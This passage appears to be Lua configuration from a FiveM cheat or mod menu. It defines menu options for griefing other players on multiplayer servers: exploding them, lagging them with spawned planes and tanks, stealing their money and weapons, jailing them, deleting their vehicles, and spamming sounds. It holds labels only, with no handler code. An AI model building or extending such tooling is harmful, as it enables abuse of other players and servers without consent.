            {text = 'Exploding bullets', dkey = 'server:allplayers:weapon_explode', desc = 'Enable exploding bullets for the players.', option = __REAPER1__.M.Checkbox, fucn = false},
            {text = 'Damage', dkey = 'server:allplayers:weapon_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Invisible', dkey = 'server:allplayers:weapon_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Audible', dkey = 'server:allplayers:weapon_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Trace bullets', dkey = 'server:allplayers:weapon_tracebullets', desc = 'Enable the tracers for the players\'\nbullets.', afu = __REAPER1__.M.aplayers.weapon.btracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bullet tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Trace impacts', dkey = 'server:allplayers:weapon_traceimpacts', desc = 'Enable the tracers for the players\'\nimpacts.', afu = __REAPER1__.M.aplayers.weapon.itracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Cartoon gun', dkey = 'server:allplayers:weapon_cartoongun', desc = 'Enable the cartoon gun for the players.', option = __REAPER1__.M.Checkbox, func = false},
        },
        
        ['server:allplayers:sound'] = {
            {text = 'Play sound', dkey = 'server:allplayers:sound_playsound', desc = 'Play a chosen sound on the players.', afu = __REAPER1__.M.aplayers.sound.sound, option = __REAPER1__.M.Button},
            {text = 'Loop sound', dkey = 'server:allplayers:sound_loopsound', desc = 'Loop a chosen sound on the players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Delay', dkey = 'server:allplayers:sound_delay', desc = 'The delay between the sounds in the\nloop.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound delay', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Type', dkey = 'server:allplayers:sound_type', desc = 'The sound to play.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound type', length = 10, tipus = 'betu', func = {'Beep', 'Screen sound','Bulldozer','Beep 2','Beep 3','Counter','Beep 4','Death screen','Beep 5','Challange unlocked','Checkpoint','Stun','Radio','Beep 6','Waypoint', 'Spawn','Text','Beep 7','Power down','Beep 8','Camera','Fail','Fail 2'}},
            {text = 'Sound rape', dkey = 'server:allplayers:sound_soundrape', desc = 'Toggle the sound raping with normal\nsounds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sound rape 2', dkey = 'server:allplayers:sound_soundrape2', desc = 'Toggle the sound raping with\nexplosions.', option = __REAPER1__.M.Checkbox, func = false, risky = true},
        },

        ['server:allplayers:trigger'] = {
            {text = 'Animation', dkey = 'server:allplayers:trigger_animation', desc = 'Force the players to play an animation.', afu = __REAPER1__.M.aplayers.trigger.anim, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation type', length = 15, tipus = 'betu', func = {'Dance', 'Punched', 'Slapped', 'Hug', 'Glowstick', 'Horse'}, risky = true},
            {text = 'Steal money', dkey = 'server:allplayers:trigger_stealmoney', desc = 'Steal the an amount of money from the\nplayers\' inventory.', afu = __REAPER1__.M.aplayers.trigger.stealm, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Money amount number', length = 20, tipus = 'szam', func = 0},
            {text = 'Steal weapon', dkey = 'server:allplayers:trigger_stealweapon', desc = 'Setal a weapon from the players\'\ninventory.', afu = __REAPER1__.M.aplayers.trigger.stealwep, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Weapon name to steal', length = 20, tipus = 'betu', func = 'None'},
            {text = 'Jail', dkey = 'server:allplayers:trigger_jail', desc = 'Jail the players for a specified amount\nof time.', afu = __REAPER1__.M.aplayers.trigger.jail, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Jail time number', length = 20, tipus = 'szam', func = 0},
            {text = 'Bill', dkey = 'server:allplayers:trigger_bill', desc = 'Send a bill to the players with a specified\nname and amount. Format: NAME AMOUNT', afu = __REAPER1__.M.aplayers.trigger.bill, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Bill name and amount', length = 30, tipus = 'vegyes', func = 'bill 0'},
            {text = 'Community servive', dkey = 'server:allplayers:trigger_commserver', desc = 'Put the players into community service.', afu = __REAPER1__.M.aplayers.trigger.commserv, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Community service amount number', length = 20, tipus = 'szam', func = 0},
            {text = 'Release comm. serv.', dkey = 'server:allplayers:trigger_rcommserver', desc = 'Release the players from community\nservice.', afu = __REAPER1__.M.aplayers.trigger.rcommserv, option = __REAPER1__.M.Button},
            {text = 'Message', dkey = 'server:allplayers:trigger_message', desc = 'Message the players with a notification.', afu = __REAPER1__.M.aplayers.trigger.message, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Message text', length = 40, tipus = 'vegyes', func = 0},
            {text = 'Carry', dkey = 'server:allplayers:trigger_carry', desc = 'Carry the players with a chosen animation\nset.', afu = __REAPER1__.M.aplayers.trigger.carry, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Carry animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Take hostage', dkey = 'server:allplayers:trigger_takehostage', desc = 'Take hostage the players with a chosen\nanimation set.', afu = __REAPER1__.M.aplayers.trigger.th, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Take hostage animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Piggyback', dkey = 'server:allplayers:trigger_piggyback', desc = 'Piggyback the players with a chosen\nanimation set.', afu = __REAPER1__.M.aplayers.trigger.piggy, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Piggyback animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Remove license', dkey = 'server:allplayers:trigger_removelicense', desc = 'Remove a specified license from the\nplayers.', afu = __REAPER1__.M.aplayers.trigger.license, option = __REAPER1__.M.Button_Textbox, textboxtext = 'License name', length = 20, tipus = 'vegyes', func = ''},
            {text = 'Play sound', dkey = 'server:allplayers:trigger_playsound', desc = 'Play a sound file on the players.', afu = __REAPER1__.M.aplayers.trigger.sound, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound file name', length = 10, tipus = 'betu', func = {'Demo', 'Seatbelt', 'Unlock', 'Lock', 'Seatbeltoff', 'Cell', 'Handcuff', 'Buckle'}},
            {text = 'Custom sound', dkey = 'server:allplayers:trigger_customsound', desc = 'Only works with youtube, you have to \ntype in the part after = in the link.', afu = __REAPER1__.M.aplayers.trigger.csound, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Youtube link', length = 30, tipus = 'vegyes', func = ''},
        },
        
        ['server:allplayers:particle'] = {
            {text = 'Play particle', dkey = 'server:allplayers:particle_particle', desc = 'Play a chosen particle on the players.', afu = __REAPER1__.M.aplayers.particle.play, option = __REAPER1__.M.Button},
            {text = 'Loop particle', dkey = 'server:allplayers:particle_loopparticle', desc = 'Loop a chosen particle on the players.', option = __REAPER1__.M.Checkbox, fucn = false},
            {text = 'Type', dkey = 'server:allplayers:particle_type', desc = 'Choose a particle type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle type', length = 10, tipus = 'betu', func = __REAPER1__.T.MParticles},
            {text = 'Scale', dkey = 'server:allplayers:particle_scale', desc = 'The particle scale.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle scale number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Delay', dkey = 'server:allplayers:particle_delay', desc = 'The particle delay in looping.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle delay number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Rotation', dkey = 'server:allplayers:particle_rotation', desc = 'The particle rotation.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle rotation number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0'},
            {text = 'Axis', dkey = 'server:allplayers:particle_axis', desc = 'The particle axis.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle axis number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0'},
        },

        ['server:allplayers:attach'] = {
            {text = 'Flag EU', dkey = 'server:allplayers:attach_euflag', desc = 'Attach a eu flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_eu_yt`},
            {text = 'Flag German', dkey = 'server:allplayers:attach_germanflag', desc = 'Attach a german flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_german_yt`},
            {text = 'Flag Russian', dkey = 'server:allplayers:attach_russianflag', desc = 'Attach a russian flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_russia_yt`},
            {text = 'Flag UK', dkey = 'server:allplayers:attach_ukflag', desc = 'Attach a uk flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_uk_yt`},
            {text = 'Flag US', dkey = 'server:allplayers:attach_usflag', desc = 'Attach a us flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_us_yt`},
            {text = 'Flag Hungarian', dkey = 'server:allplayers:attach_hunflag', desc = 'Attach a hungarian flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_hungary`},
            {text = 'Flag French', dkey = 'server:allplayers:attach_frenchflag', desc = 'Attach a french flag to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_france`},
            {text = 'Body parts', dkey = 'server:allplayers:attach_bodyparts', desc = 'Attach body parts to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `v_ilev_body_parts`},
            {text = 'Ball', dkey = 'server:allplayers:attach_ball', desc = 'Attach a ball to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `v_ilev_exball_blue`},
            {text = 'Snowman', dkey = 'server:allplayers:attach_snowman', desc = 'Attach a snowman to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `prop_prlg_snowpile`},
            {text = 'Safe', dkey = 'server:allplayers:attach_safe', desc = 'Attach a safe to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `p_v_43_safe_s`},
            {text = 'Windmill', dkey = 'server:allplayers:attach_windmill', desc = 'Attach a windmill to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `prop_windmill_01`},
            {text = 'UFO', dkey = 'server:allplayers:attach_ufo', desc = 'Attach a ufo to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `imp_prop_ship_01a`},
            {text = 'Alien egg', dkey = 'server:allplayers:attach_alienegg', desc = 'Attach a alien egg to the player.', afu = __REAPER1__.M.aplayers.attach.attach, option = __REAPER1__.M.Button, extra = `prop_alien_egg_01`},
        },

        ['server:targetinglist'] = {
            {text = 'Targeted players', dkey = 'server:targetinglist:targetedplayers', desc = 'Targeted players menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:targetedplayers'}, lasto = 1, scrollo = 0, addedo = 0},
        },

        ['server:targetinglist:targetedplayers'] = {
        },

        ['server:targetinglist:exploits'] = {
            {text = 'Bug vehicle', dkey = 'server:targetinglist:exploits_bugvehicle', desc = 'Bug the player\'s vehicle.', afu = __REAPER1__.M.tlist.exploits.bugveh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Lagging', option = __REAPER1__.M.Separator},
            {text = 'Lag amount', dkey = 'server:targetinglist:exploits_lagamount', desc = 'Set the amount of lagging vehicles.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lag amount number', length = 2, tipus = 'szam', func = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}},
            {text = 'Clean up', dkey = 'server:targetinglist:exploits_cleanup', desc = 'Clean up the spawned vehicles.', afu = __REAPER1__.M.tlist.exploits.cleanup, option = __REAPER1__.M.Button},
            {text = 'Plane', dkey = 'server:targetinglist:exploits_planes', desc = 'Lag the player with planes.', afu = __REAPER1__.M.tlist.exploits.lag, option = __REAPER1__.M.Button, extra = `cargoplane`},
            {text = 'Plane 2', dkey = 'server:targetinglist:exploits_planes2', desc = 'Lag the player with planes.', afu = __REAPER1__.M.tlist.exploits.lag, option = __REAPER1__.M.Button, extra = `jet`},
            {text = 'Blimp', dkey = 'server:targetinglist:exploits_blimp', desc = 'Lag the player with blimps.', afu = __REAPER1__.M.tlist.exploits.lag, option = __REAPER1__.M.Button, extra = `blimp`},
            {text = 'Tank', dkey = 'server:targetinglist:exploits_tank', desc = 'Lag the player with tanks.', afu = __REAPER1__.M.tlist.exploits.lag, option = __REAPER1__.M.Button, extra = `rhino`},
        },
        
        ['server:targetinglist:explosion'] = {
            {text = 'Explode', dkey = 'server:targetinglist:explosion_explode', desc = 'Explode the players.', afu = __REAPER1__.M.tlist.explosion.explode, option = __REAPER1__.M.Button},
            {text = 'Loop explode', dkey = 'server:targetinglist:explosion_loopexplode', desc = 'Loop exploding the players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'server:targetinglist:explosion_type', desc = 'Select the type of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion type', length = 10, tipus = 'betu', func = __REAPER1__.T.Explosions},
            {text = 'Damage', dkey = 'server:targetinglist:explosion_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Invisible', dkey = 'server:targetinglist:explosion_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Audible', dkey = 'server:targetinglist:explosion_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['server:targetinglist:vehicle'] = {
            {text = 'Delete', dkey = 'server:targetinglist:vehiclev_deletevehicle', desc = 'Delete the vehicle the players are\nsitting in.', afu = __REAPER1__.M.tlist.vehicle.deletevehicle, option = __REAPER1__.M.Button},
            {text = 'Launch', dkey = 'server:targetinglist:vehiclev_launchvehicle', desc = 'Launch the players\'s vehicle in the sky.', afu = __REAPER1__.M.tlist.vehicle.launchveh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Launch power number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Remove wheels', dkey = 'server:targetinglist:vehiclev_removewheels', desc = 'Remove the wheels of the vehicle the\nplayers are sitting in.', afu = __REAPER1__.M.tlist.vehicle.removewheels, option = __REAPER1__.M.Button},
            {text = 'Set speed (kmh)', dkey = 'server:targetinglist:vehiclev_setspeed', desc = 'Set the speed of the vehicle the\nplayers are sitting in.', afu = __REAPER1__.M.tlist.vehicle.setspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Clone', dkey = 'server:targetinglist:vehiclev_clonevehicle', desc = 'Clone the vehicle the players are\nsitting in.', afu = __REAPER1__.M.tlist.vehicle.cloneveh, option = __REAPER1__.M.Button},
            {text = 'Freeze', dkey = 'server:targetinglist:vehiclev_freeze', desc = 'Freeze the vehicle the players are\nsitting in.', afu = __REAPER1__.M.tlist.vehicle.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Customs', option = __REAPER1__.M.Separator},
            {text = 'Fuck up', dkey = 'server:targetinglist:vehiclev_fuckup', desc = 'Fuck up the vehicle the players are\nsitting in.', afu = __REAPER1__.M.tlist.vehicle.fuckup, option = __REAPER1__.M.Button},
            {text = 'Tune', dkey = 'server:targetinglist:vehiclev_tune', desc = 'Tune the vehicle the players are sitting\nin.', afu = __REAPER1__.M.tlist.vehicle.tune, option = __REAPER1__.M.Button},
            {text = 'Downgrade', dkey = 'server:targetinglist:vehiclev_downgrade', desc = 'Downgrade the vehicle the players\nare sitting in.', afu = __REAPER1__.M.tlist.vehicle.downgrade, option = __REAPER1__.M.Button},
            {text = 'Fix', dkey = 'server:targetinglist:vehiclev_fix', desc = 'Fix the vehicle the players are sitting in.', afu = __REAPER1__.M.tlist.vehicle.fix, option = __REAPER1__.M.Button},
            {text = 'Randomize', dkey = 'server:targetinglist:vehiclev_randomize', desc = 'Randomize the vehicle the players\nare sitting in.', afu = __REAPER1__.M.tlist.vehicle.randomize, option = __REAPER1__.M.Button},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Fuel', dkey = 'server:targetinglist:vehiclev_fuel', desc = 'Set fuel in the vehicle the players\nare sitting in.', afu = __REAPER1__.M.tlist.vehicle.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fuel amount number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Door lock', dkey = 'server:targetinglist:vehiclev_doorlock', desc = 'Toggle the door lock for the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.tlist.vehicle.lock, option = __REAPER1__.M.Button},
            {text = 'Open door', dkey = 'server:targetinglist:vehiclev_opendoor', desc = 'Open a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.tlist.vehicle.open, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Close door', dkey = 'server:targetinglist:vehiclev_closedoor', desc = 'Close a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.tlist.vehicle.close, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Delete door', dkey = 'server:targetinglist:vehiclev_deletedoor', desc = 'Delete a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.tlist.vehicle.delete, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Flip', dkey = 'server:targetinglist:vehiclev_flip', desc = 'Flip upside down the vehicle the players\nare sitting in.', afu = __REAPER1__.M.tlist.vehicle.flip, option = __REAPER1__.M.Button},
        },

        ['server:targetinglist:weapon'] = {
            {text = 'Give weapon', dkey = 'server:targetinglist:weapon_giveweapon', desc = 'Give a chosen weapon to the players.', afu = __REAPER1__.M.tlist.weapon.give, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Spawn weapon', dkey = 'server:targetinglist:weapon_spawnweapon', desc = 'Spawn a chosen weapon to the players.', afu = __REAPER1__.M.tlist.weapon.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Remove weapon', dkey = 'server:targetinglist:weapon_removeweapon', desc = 'Remove a chosen weapon from the\nplayers.', afu = __REAPER1__.M.tlist.weapon.remove, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Remove current', dkey = 'server:targetinglist:weapon_removecurrent', desc = 'Remove the current weapon of the\nplayers.', afu = __REAPER1__.M.tlist.weapon.removec, option = __REAPER1__.M.Button},
            {text = 'Ammo', dkey = 'server:targetinglist:weapon_ammo', desc = 'Remove or give a weapon with this\nammo count.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo amount number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Exploding bullets', option = __REAPER1__.M.Separator},
            {text = 'Exploding bullets', dkey = 'server:targetinglist:weapon_explode', desc = 'Enable exploding bullets for the players.', option = __REAPER1__.M.Checkbox, fucn = false},
            {text = 'Damage', dkey = 'server:targetinglist:weapon_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Invisible', dkey = 'server:targetinglist:weapon_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Audible', dkey = 'server:targetinglist:weapon_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Trace bullets', dkey = 'server:targetinglist:weapon_tracebullets', desc = 'Enable the tracers for the players\'\nbullets.', afu = __REAPER1__.M.tlist.weapon.btracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bullet tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Trace impacts', dkey = 'server:targetinglist:weapon_traceimpacts', desc = 'Enable the tracers for the players\'\nimpacts.', afu = __REAPER1__.M.tlist.weapon.itracer, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Cartoon gun', dkey = 'server:targetinglist:weapon_cartoongun', desc = 'Enable the cartoon gun for the players.', option = __REAPER1__.M.Checkbox, func = false},
        },
        
        ['server:targetinglist:sound'] = {
            {text = 'Play sound', dkey = 'server:targetinglist:sound_playsound', desc = 'Play a chosen sound on the players.', afu = __REAPER1__.M.tlist.sound.sound, option = __REAPER1__.M.Button},
            {text = 'Loop sound', dkey = 'server:targetinglist:sound_loopsound', desc = 'Loop a chosen sound on the players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Delay', dkey = 'server:targetinglist:sound_delay', desc = 'The delay between the sounds in the\nloop.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound delay', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Type', dkey = 'server:targetinglist:sound_type', desc = 'The sound to play.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound type', length = 10, tipus = 'betu', func = {'Beep', 'Screen sound','Bulldozer','Beep 2','Beep 3','Counter','Beep 4','Death screen','Beep 5','Challange unlocked','Checkpoint','Stun','Radio','Beep 6','Waypoint', 'Spawn','Text','Beep 7','Power down','Beep 8','Camera','Fail','Fail 2'}},
            {text = 'Sound rape', dkey = 'server:targetinglist:sound_soundrape', desc = 'Toggle the sound raping with normal\nsounds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sound rape 2', dkey = 'server:targetinglist:sound_soundrape2', desc = 'Toggle the sound raping with\nexplosions.', option = __REAPER1__.M.Checkbox, func = false, risky = true},
        },
        
        ['server:targetinglist:trigger'] = {
            {text = 'Animation', dkey = 'server:targetinglist:trigger_animation', desc = 'Force the players to play an animation.', afu = __REAPER1__.M.tlist.trigger.anim, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation type', length = 15, tipus = 'betu', func = {'Dance', 'Punched', 'Slapped', 'Hug', 'Glowstick', 'Horse'}, risky = true},
            {text = 'Steal money', dkey = 'server:targetinglist:trigger_stealmoney', desc = 'Steal the an amount of money from the\nplayers\' inventory', afu = __REAPER1__.M.tlist.trigger.stealm, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Money amount number', length = 20, tipus = 'szam', func = 0},
            {text = 'Steal weapon', dkey = 'server:targetinglist:trigger_stealweapon', desc = 'Setal a weapon from the players\'\ninventory.', afu = __REAPER1__.M.tlist.trigger.stealwep, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Weapon name to steal', length = 20, tipus = 'betu', func = 'None'},
            {text = 'Jail', dkey = 'server:targetinglist:trigger_jail', desc = 'Jail the players for a specified amount\nof time.', afu = __REAPER1__.M.tlist.trigger.jail, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Jail time number', length = 20, tipus = 'szam', func = 0},
            {text = 'Bill', dkey = 'server:targetinglist:trigger_bill', desc = 'Send a bill to the players with a specified\nname and amount. Format: NAME AMOUNT', afu = __REAPER1__.M.tlist.trigger.bill, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Bill name and amount', length = 30, tipus = 'vegyes', func = 'bill 0'},
            {text = 'Community servive', dkey = 'server:targetinglist:trigger_commserver', desc = 'Put the players into community service.', afu = __REAPER1__.M.tlist.trigger.commserv, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Community service amount number', length = 20, tipus = 'szam', func = 0},
            {text = 'Release comm. serv.', dkey = 'server:targetinglist:trigger_rcommserver', desc = 'Release the players from community\nservice.', afu = __REAPER1__.M.tlist.trigger.rcommserv, option = __REAPER1__.M.Button},
            {text = 'Message', dkey = 'server:targetinglist:trigger_message', desc = 'Message the players with a notification.', afu = __REAPER1__.M.tlist.trigger.message, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Message text', length = 40, tipus = 'vegyes', func = 0},
            {text = 'Carry', dkey = 'server:targetinglist:trigger_carry', desc = 'Carry the players with a chosen animation\nset.', afu = __REAPER1__.M.tlist.trigger.carry, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Carry animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Take hostage', dkey = 'server:targetinglist:trigger_takehostage', desc = 'Take hostage the players with a chosen \nnimation set.', afu = __REAPER1__.M.tlist.trigger.th, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Take hostage animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Piggyback', dkey = 'server:targetinglist:trigger_piggyback', desc = 'Piggyback the players with a chosen\nanimation set.', afu = __REAPER1__.M.tlist.trigger.piggy, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Piggyback animation', length = 10, tipus = 'betu', func = {'Default', 'Secks', 'Weird'}},
            {text = 'Remove license', dkey = 'server:targetinglist:trigger_removelicense', desc = 'Remove a specified license from the\nplayers.', afu = __REAPER1__.M.tlist.trigger.license, option = __REAPER1__.M.Button_Textbox, textboxtext = 'License name', length = 20, tipus = 'vegyes', func = ''},
            {text = 'Play sound', dkey = 'server:targetinglist:trigger_playsound', desc = 'Play a sound file on the players.', afu = __REAPER1__.M.tlist.trigger.sound, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sound file name', length = 10, tipus = 'betu', func = {'Demo', 'Seatbelt', 'Unlock', 'Lock', 'Seatbeltoff', 'Cell', 'Handcuff', 'Buckle'}},
            {text = 'Custom sound', dkey = 'server:targetinglist:trigger_customsound', desc = 'Only works with youtube, you have to\ntype in the part after = in the link.', afu = __REAPER1__.M.tlist.trigger.csound, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Youtube link', length = 30, tipus = 'vegyes', func = ''},
        },
        
        ['server:targetinglist:particle'] = {
            {text = 'Play particle', dkey = 'server:targetinglist:particle_particle', desc = 'Play a chosen particle on the players.', afu = __REAPER1__.M.tlist.particle.play, option = __REAPER1__.M.Button},
            {text = 'Loop particle', dkey = 'server:targetinglist:particle_loopparticle', desc = 'Loop a chosen particle on the players.', option = __REAPER1__.M.Checkbox, fucn = false},
            {text = 'Type', dkey = 'server:targetinglist:particle_type', desc = 'Choose a particle type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle type', length = 10, tipus = 'betu', func = __REAPER1__.T.MParticles},
            {text = 'Scale', dkey = 'server:targetinglist:particle_scale', desc = 'The particle scale.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle scale number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Delay', dkey = 'server:targetinglist:particle_delay', desc = 'The particle delay in looping.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle delay number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Rotation', dkey = 'server:targetinglist:particle_rotation', desc = 'The particle rotation.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle rotation number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0'},
            {text = 'Axis', dkey = 'server:targetinglist:particle_axis', desc = 'The particle axis.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Particle axis number', length = 20, tipus = 'vegyes', func = '0.0 0.0 0.0'},
        },
        
        ['server:targetinglist:attach'] = {
            {text = 'Flag EU', dkey = 'server:targetinglist:attach_euflag', desc = 'Attach a eu flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_eu_yt`},
